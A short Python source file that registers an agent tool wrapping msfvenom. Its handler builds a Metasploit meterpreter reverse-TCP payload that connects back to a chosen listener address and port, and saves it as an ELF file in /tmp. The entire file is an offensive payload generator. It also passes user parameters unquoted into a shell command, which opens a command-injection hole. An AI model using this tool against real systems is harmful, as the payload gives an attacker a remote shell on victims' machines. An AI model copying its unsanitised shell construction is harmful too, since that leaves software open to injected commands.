#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成MSF payload"""


from registry import tool
from utils import run_cmd
from helpers import *  # noqa: F401,F403


@tool(
    "msfvenom_payload",
    "生成MSF payload",
    {
        "properties": {
            "payload": {
                "type": "string",
                "description": "类型(linux/x64/meterpreter_reverse_tcp)",
                "default": "linux/x64/meterpreter_reverse_tcp",
            },
            "lhost": {
                "type": "string",
                "description": "监听IP",
                "default": None,
            },
            "lport": {
                "type": "integer",
                "description": "端口(4444)",
                "default": 4444,
            },
            "format": {
                "type": "string",
                "description": "格式(elf)",
                "default": "elf",
            },
        },
        "required": ["lhost"],
    },
)
def msfvenom_payload_handler(params):
    # 输出路径写死 /tmp/payload.<format>，同名直接覆盖，连跑两次只留最后一份
    p=params.get("payload","linux/x64/meterpreter_reverse_tcp");lh=params.get("lhost","");lp=params.get("lport",4444);f=params.get("format","elf");out="/tmp/payload."+f; return run_cmd("msfvenom -p %s LHOST=%s LPORT=%d -f %s -o %s 2>&1||echo '需metasploit'" % (p,lh,lp,f,out),60)
